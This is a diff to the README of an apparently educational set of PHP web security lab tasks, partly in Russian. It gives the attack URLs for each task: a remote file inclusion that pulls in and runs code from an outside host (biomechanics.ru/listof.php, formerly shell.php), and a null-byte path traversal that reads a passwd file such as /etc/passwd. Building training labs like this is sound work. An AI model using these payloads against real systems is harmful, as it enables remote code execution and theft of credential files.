@@ -1,17 +1,25 @@
-These are test tasks on web security. Description follows.
+These are test tasks on web security. Description and instructions for reproducing the attack follows.
+All the tasks are tested and worked on OpenServer 4.8.7, though the configuration of the server doesn't matter.
+The server name is assumed to be 'localhost'.
 
 Task 1
-На сервере должны быть включены register_globals и allow_url_fopen.
+Участвующие файлы:
+task1.php, располагается в корневой папке атакуемого сервера.
+На сервере должны быть включены register_globals, allow_url_fopen и allow_url_include.
  
-Для взлома вводится url вида target-site.com/page1.php?file_to_open=http://some-other-site/shell.php
-В данных настройках это приведет к подключению удаленного файла shell.php в скрипт page1.php и его исполнению.
+Для взлома данная страница открывается через url
+http://localhost/task1.php?file_to_open=http://biomechanics.ru/listof.php
+В данных настройках это приведет к подключению удаленного файла listof.php в скрипт task1.php и его исполнению.
 Для атаки нужно знать имя переменной file_to_open
 
 
 Task 2
-Здесь используется вставка нулевого байта в плохо экранированную строку, которая используется в параметре функции require_once.
+Участвующие файлы:
+task2.php, располагается в корневой папке атакуемого сервера.
+passwd, располагается в папке на один уровень выше (предположительно недоступной для просмотра веб-пользователям).
+
+Для взлома используется вставка нулевого байта в нотации C++ в плохо экранированную строку, которая используется в параметре функции require_once. Для этого страница открывается через url
+http://localhost/task2.php?file=../passwd%00
  
-Для взлома в параметре GET передается предполагаемый путь к списку паролей, либо любому другому важному файлу:
-target-site.com/page1.php?file=../../../etc/passwd%00
- 
-Для успешной выдачи файла на вывод нужно, чтобы нулевой символ безпрепятственно прошел экранирование.
+При этом файл passwd выдается на страницу. В результате получается следующий вывод:
+"admin	pass task2 worked"
